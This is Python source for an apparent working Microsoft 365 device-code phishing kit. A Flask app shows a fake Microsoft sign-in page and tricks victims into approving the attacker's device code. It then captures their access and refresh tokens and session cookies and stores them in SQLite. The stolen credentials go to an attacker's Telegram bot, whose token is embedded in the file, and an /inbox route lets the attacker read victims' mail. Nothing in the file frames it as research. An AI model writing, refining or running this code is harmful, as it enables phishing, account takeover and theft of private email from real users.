import os
import time
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

# ─────────────────────────────────────────────
# CONFIGURATION
# ─────────────────────────────────────────────
TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft first-party "Microsoft Office" client - no unverified warning
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
AUTHORITY = "https://login.microsoftonline.com/common"
GRAPH = "https://graph.microsoft.com/v1.0"

# Try these in order - first one Microsoft accepts wins
SCOPE_CANDIDATES = [
    "openid profile offline_access User.Read Mail.Read",
    "User.Read offline_access",
    "openid offline_access Mail.ReadWrite User.Read",
    "https://outlook.office.com/Mail.ReadWrite offline_access",
]

app = Flask(__name__)
DB = "sessions.db"

def db():
    conn = sqlite3.connect(DB)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
        refresh_token TEXT, expires_at REAL, cookies TEXT)""")
    conn.commit()
    return conn

def telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=15)
    except Exception as e:
        print(f"Telegram Error: {e}")

def harvest_cookies(refresh_token, scope):
    """Browser-style session to collect login cookies."""
    jar = {}
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
    try:
        s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
            "grant_type": "refresh_token", "client_id": CLIENT_ID,
            "refresh_token": refresh_token, "scope": scope}, timeout=20)
        s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
              f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
              f"https://login.microsoftonline.com/common/oauth2/v2.0/"
              f"authorize&scope=openid&prompt=none", timeout=20)
        for c in s.cookies:
            jar[c.name] = c.value
    except Exception as e:
        print(f"Cookie Harvest Error: {e}")
    return jar

def try_token(sid, dc, scope):
    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID, "device_code": dc["device_code"]}, timeout=20)
    j = r.json()
    if "access_token" in j:
        who = requests.get(f"{GRAPH}/me",
            headers={"Authorization": "Bearer " + j["access_token"]}, timeout=20).json()
        email = who.get("userPrincipalName", "unknown")
        cookies = harvest_cookies(j.get("refresh_token", ""), scope)
        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())

        conn = db()
        conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
            (sid, email, j["access_token"], j.get("refresh_token", ""),
             time.time() + j.get("expires_in", 3600), cookie_txt))
        conn.commit(); conn.close()

        telegram(
            "NEW CATCH\n"
            "Email: " + email + "\n\n"
            "ACCESS TOKEN:\n" + j["access_token"] + "\n\n"
            "REFRESH TOKEN (survives password change):\n"
            + j.get("refresh_token", "none") + "\n\n"
            "COOKIES:\n" + (cookie_txt if cookie_txt else "none captured") +
            "\n\nMailbox viewer: /inbox/" + sid)
        return True
    return j.get("error") == "authorization_pending"

def watcher(sid, dc, scope):
    for _ in range(180):
        try:
            if try_token(sid, dc, scope):
                pending[sid] = "done"
                return
        except Exception as e:
            print(f"Watcher Error: {e}")
        time.sleep(5)

pending = {}

PAGE = """<!doctype html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;padding:44px 40px;width:100%;max-width:440px;
box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{font-size:22px;margin-bottom:18px;font-weight:600}
h2{font-size:20px;font-weight:600;margin:0 0 8px}
p{font-size:14px;line-height:1.5}
.code{font-size:28px;font-weight:700;letter-spacing:3px;color:#0067b8;
background:#f3f2f1;padding:12px;text-align:center;margin:14px 0;user-select:all}
.btn{display:block;width:100%;background:#0067b8;color:#fff;text-decoration:none;
padding:11px 0;font-size:15px;font-weight:600;border:none;cursor:pointer;
border-radius:3px;text-align:center;margin-top:8px}
.note{font-size:12px;color:#605e5c;margin-top:20px}
.err{font-size:13px;color:#d13438;word-break:break-all}
</style></head><body>
<div class='card'>
<div class='logo'><b style='color:#0067b8'>M</b>icrosoft</div>
<h2>Sign in required</h2>
{% if error %}
  <p>Could not start sign-in right now.</p>
  <p class='err'>Details: {{ error }}</p>
  <button class='btn' onclick='location.reload()'>Retry</button>
{% else %}
  <p>Enter this code at the Microsoft sign-in page.</p>
  <div class='code' id='code'>{{ user_code }}</div>
  <button class='btn' onclick='go()'>Copy Code &amp; Sign In</button>
  <p class='note'>Code expires in 15 minutes. Do not close this window.</p>
{% endif %}
</div>
{% if not error %}
<script>
let sid="{{ sid }}";
function go(){
  let c=document.getElementById('code').innerText;
  if(navigator.clipboard){navigator.clipboard.writeText(c);}
  window.open("https://microsoft.com/devicelogin","_blank");
}
setInterval(async()=>{
  try{
    let r=await fetch('/status?sid='+sid);
    let j=await r.json();
    if(j.done){location.href="https://outlook.office.com/mail";}
  }catch(e){}
},4000);
</script>
{% endif %}
</body></html>"""

@app.route("/")
def home():
    ms_error = ""
    for scope in SCOPE_CANDIDATES:
        try:
            resp = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
                data={"client_id": CLIENT_ID, "scope": scope}, timeout=15)
            dc = resp.json()
            if "user_code" in dc:
                sid = str(int(time.time()))
                pending[sid] = dc
                Thread(target=watcher, args=(sid, dc, scope), daemon=True).start()
                return render_template_string(PAGE, user_code=dc["user_code"],
                                              sid=sid, error=None)
            ms_error = f"{dc.get('error')}: {dc.get('error_description', '')[:200]}"
            print(f"Scope '{scope}' rejected: {ms_error}")
        except Exception as e:
            ms_error = f"network: {e}"
            print(f"Device code request error: {e}")
    return render_template_string(PAGE, error=ms_error or "unknown", user_code="", sid="")

@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    return jsonify({"done": pending.get(sid) == "done"})

@app.route("/inbox/<sid>")
def inbox(sid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return "No session. Check Telegram.", 404
    token = row[2]
    msgs = requests.get(
        f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&$select=subject,from,bodyPreview",
        headers={"Authorization": "Bearer " + token}, timeout=20).json()
    rows = "".join(
        f"<tr><td>{(m.get('from') or {}).get('emailAddress', {}).get('address','?')}</td>"
        f"<td>{m.get('subject','')}</td><td>{m.get('bodyPreview','')}</td></tr>"
        for m in msgs.get("value", []))
    return f"<h2>Inbox: {row[1]}</h2><table border=1 cellpadding=6>{rows}</table>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
